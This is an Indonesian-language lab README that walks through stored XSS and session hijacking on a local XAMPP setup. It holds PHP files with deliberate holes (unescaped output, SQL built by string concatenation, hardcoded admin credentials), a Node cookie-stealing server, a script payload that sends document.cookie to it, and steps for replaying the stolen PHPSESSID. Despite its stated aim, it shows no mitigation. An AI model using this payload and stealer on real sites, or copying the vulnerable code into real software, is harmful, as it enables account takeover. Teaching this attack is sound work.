# 🔒 Eksperimen Keamanan Web: Cross-Site Scripting (XSS)

Eksperimen ini mendemonstrasikan dua jenis serangan XSS (Reflected dan Stored) secara lokal menggunakan XAMPP dan Node.js. Tujuannya adalah untuk memahami cara kerja XSS dan cara mitigasinya.

---

## 🧰 Persiapan Lingkungan

### ✅ Alat yang Dibutuhkan
- [XAMPP](https://www.apachefriends.org/index.html) (Apache & MySQL)
- [Node.js](https://nodejs.org)
- Web browser (Chrome/Firefox)
- Text editor (VS Code/Notepad++)

---

## 📁 Struktur Direktori
xss_advanced/

		├── comment_form.php
		├── save_comment.php
		├── view_comments.php
		├── dashboard.php
		├── login.php
		├── logout.php
		├── db.php
		├── style.css
		└── xss_listener/
		└── server.js

---

## ⚙️ Setup Database MySQL

### 1. Buat Database Baru
Masuk ke `http://localhost/phpmyadmin`, buat database baru bernama `xss_advanced`.

### 2. Jalankan SQL Berikut:
	```sql
	CREATE TABLE `comments` (
	  `id` INT AUTO_INCREMENT PRIMARY KEY,
	  `username` VARCHAR(50),
	  `comment` TEXT
	);
	
	CREATE TABLE `users` (
	  `id` INT AUTO_INCREMENT PRIMARY KEY,
	  `username` VARCHAR(50),
	  `password` VARCHAR(255)
	);
	
	INSERT INTO users (username, password) VALUES ('admin', '1234');

![00001 set database](https://github.com/user-attachments/assets/b9589c6a-a75a-49fd-9c72-27774e16794d)

---

## 🧱 Langkah-Langkah
### 1. Buat Login.php
	<?php
	session_start();
	if ($_POST) {
	    if ($_POST['username'] == 'admin' && $_POST['password'] == '1234') {
	        $_SESSION['username'] = 'admin';
	        header("Location: dashboard.php");
	        exit;
	    } else {
	        echo "Login gagal!";
	    }
	}
	?>
	
	<form method="POST">
	  Username: <input name="username"><br>
	  Password: <input name="password" type="password"><br>
	  <input type="submit" value="Login">
	</form>
 ![00004 buat login](https://github.com/user-attachments/assets/bed74722-2d0b-465e-a262-82efc3334875)

### 2. Buat Dashboard.php
	<?php
	session_start();
	if (!isset($_SESSION['username'])) {
	    header("Location: login.php");
	    exit;
	}
	echo "Selamat datang, " . $_SESSION['username'] . "<br>";
	echo "<a href='comment_form.php'>Komentar</a>";
 ![00005 buat dasboard](https://github.com/user-attachments/assets/bdecc90a-1d66-4d58-9a42-3826b1d02cc4)
### 3. Buat comment_form.php
	<form action="save_comment.php" method="POST">
	    Username: <input type="text" name="username"><br>
	    Komentar: <textarea name="comment"></textarea><br>
	    <input type="submit" value="Kirim">
	</form>
![00006 buat comment_form](https://github.com/user-attachments/assets/3117d805-3782-4b25-b9ed-fe9a1b0bc825)

### 4. Buat save_comment.php
	<?php
	$conn = new mysqli("localhost", "root", "", "xss_advanced");
	
	$username = $_POST['username'];
	$comment = $_POST['comment'];
	
	$conn->query("INSERT INTO comments (username, comment) VALUES ('$username', '$comment')");
	echo "Komentar berhasil disimpan.<br>";
	echo "<a href='view_comments.php'>Lihat Komentar</a>";
	?>
 ![00009 buat save_comment](https://github.com/user-attachments/assets/390e8ab8-1465-4764-850d-876eb8a0e0ae)

### 5. Buat view_comments.php
	<?php
	$conn = new mysqli("localhost", "root", "", "xss_advanced");
	$result = $conn->query("SELECT * FROM comments");
	
	while ($row = $result->fetch_assoc()) {
	    echo "<b>" . $row['username'] . "</b>: " . $row['comment'] . "<br><hr>";
	}
	?>
 ![00007 buat view_comment](https://github.com/user-attachments/assets/b366b32d-d228-4f5e-a934-956f63586e40)

### 6. Buat db.php
	<?php
	$conn = new mysqli("localhost", "root", "", "xss_advanced");
	if ($conn->connect_error) {
	    die("Koneksi gagal: " . $conn->connect_error);
	}
	?>
 ![Screenshot 2025-05-02 033214](https://github.com/user-attachments/assets/934937d8-3ffe-4e9a-b961-5aeffcac7334)

### 7. Buat stealer.js
	const http = require('http');
	const fs = require('fs');
	
	http.createServer((req, res) => {
	    const url = require('url').parse(req.url, true);
	    if (url.pathname === '/steal') {
	        const log = `Stolen cookie: ${url.query.c}\n`;
	        fs.appendFileSync('stolen_cookies.txt', log);
	        res.end("OK");
	    } else {
	        res.end("Nothing here.");
	    }
	}).listen(1337);
	
	console.log("Listening on http://localhost:1337");
 ![00008 buat stealer js](https://github.com/user-attachments/assets/c17fabf3-86bd-440c-89f9-1b2e3da56dcd)

 ---
## 🔁 Simulasi Serangan
### Jalankan stealer.js dari terminal dengan cara:
	cd C:\xampp\htdocs\xss_advanced\stealer_server
	node stealer.js
maka Server akan listen di http://localhost:1337. Pastikan port 1337 tidak diblok firewall.
### a. Jalankan Web Server
buka browser dan jalankan: http://localhost/xss_advanced/login.php
### b. Login sebagai admin
	isi:
	Username: admin
	Password: 1234
![00011 localhost loginphp](https://github.com/user-attachments/assets/6f668e5f-0225-49ae-949a-af0d7f55b281)
### c Masukkan komentar jahat
	isi:
	Username: attacker
	Password: <script>
		fetch("http://localhost:1337/steal?c=" + document.cookie)
		</script>
  ![00012 localhost commentphp](https://github.com/user-attachments/assets/6ecef83f-becf-46f7-b4f9-24b3b032554e)

### d. Akses view_comments.php
Admin membuka halaman komentar → skrip dijalankan → cookie dikirim ke stealer.js.
![00013 localhost comment disimpan](https://github.com/user-attachments/assets/1c5bfc1b-ef6a-4dd0-af11-68bf794fc72d)

### 7. Lihat Cookie Dicuri
Cek isi file stolen_cookies.txt(otomatis terbuat) di folder stealer_server/:
![00014 cookie dicuri](https://github.com/user-attachments/assets/e327ad2a-8d4e-401c-9cbd-84959a49b75d)
### 8. Gunakan Cookie untuk Bajak Sesi
	1. Buka browser baru/incognito.
 	2. Akses login.php
	2. Tekan F12 → buka tab Application → pilih Cookies → tambahkan:
		Name: PHPSESSID
		Value: abc123456...(diliat di file stolen_cookies.txt)
  	4. Lalu buka:
   		http://localhost/xss_advanced/dashboard.php
		Jika sesi PHPSESSID valid, kamu akan masuk halaman dashboard sebagai admin!





